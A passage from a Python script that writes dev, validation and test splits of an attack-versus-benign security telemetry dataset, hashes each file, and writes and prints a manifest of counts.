    test_scenarios = [s for s in scenarios if s["split"] == "test"]

    dev_path = output_dir / "dev_set.json"
    with open(dev_path, "w", encoding="utf-8") as f:
        json.dump(dev_scenarios, f, indent=2)

    val_path = output_dir / "val_set.json"
    with open(val_path, "w", encoding="utf-8") as f:
        json.dump(val_scenarios, f, indent=2)

    test_path = output_dir / "test_set.json"
    with open(test_path, "w", encoding="utf-8") as f:
        json.dump(test_scenarios, f, indent=2)

    # 3. Compute Hashes
    def sha256_file(p: Path) -> str:
        return hashlib.sha256(p.read_bytes()).hexdigest()

    manifest = {
        "dataset_name": "RESEARCH_DATASET_V2",
        "dataset_version": "v2.0",
        "created_at": datetime.now(UTC).isoformat(),
        "total_scenarios": len(scenarios),
        "attack_count": sum(1 for s in scenarios if s["ground_truth"] == "ATTACK"),
        "benign_count": sum(1 for s in scenarios if s["ground_truth"] == "BENIGN"),
        "total_telemetry_events": sum(s["events_count"] for s in scenarios),
        "split_distribution": {
            "development": {
                "total": len(dev_scenarios),
                "attack": sum(1 for s in dev_scenarios if s["ground_truth"] == "ATTACK"),
                "benign": sum(1 for s in dev_scenarios if s["ground_truth"] == "BENIGN"),
                "sha256": sha256_file(dev_path),
            },
            "validation": {
                "total": len(val_scenarios),
                "attack": sum(1 for s in val_scenarios if s["ground_truth"] == "ATTACK"),
                "benign": sum(1 for s in val_scenarios if s["ground_truth"] == "BENIGN"),
                "sha256": sha256_file(val_path),
            },
            "test": {
                "total": len(test_scenarios),
                "attack": sum(1 for s in test_scenarios if s["ground_truth"] == "ATTACK"),
                "benign": sum(1 for s in test_scenarios if s["ground_truth"] == "BENIGN"),
                "sha256": sha256_file(test_path),
            },
        },
        "full_dataset_sha256": sha256_file(full_path),
    }

    manifest_path = output_dir / "dataset_v2_manifest.json"
    with open(manifest_path, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)

    return manifest


def main():
    root_dir = Path(__file__).resolve().parents[2]
    target_dir = root_dir / "research" / "datasets" / "dataset_v2"
    print(f"[+] Generating Research Dataset V2 into: {target_dir}")

    scenarios = generate_all_scenarios()
    manifest = write_dataset_files(scenarios, target_dir)

    print(f"[+] Generated {manifest['total_scenarios']} scenarios:")
    print(f"    - Attack: {manifest['attack_count']}")
    print(f"    - Benign: {manifest['benign_count']}")
    print(f"    - Total Events: {manifest['total_telemetry_events']}")
    print(f"    - Dev:  {manifest['split_distribution']['development']['total']} ({manifest['split_distribution']['development']['attack']} atk / {manifest['split_distribution']['development']['benign']} ben)")
    print(f"    - Val:  {manifest['split_distribution']['validation']['total']} ({manifest['split_distribution']['validation']['attack']} atk / {manifest['split_distribution']['validation']['benign']} ben)")
    print(f"    - Test: {manifest['split_distribution']['test']['total']} ({manifest['split_distribution']['test']['attack']} atk / {manifest['split_distribution']['test']['benign']} ben)")
    print("[+] Dataset V2 generation complete.")


if __name__ == "__main__":
    main()
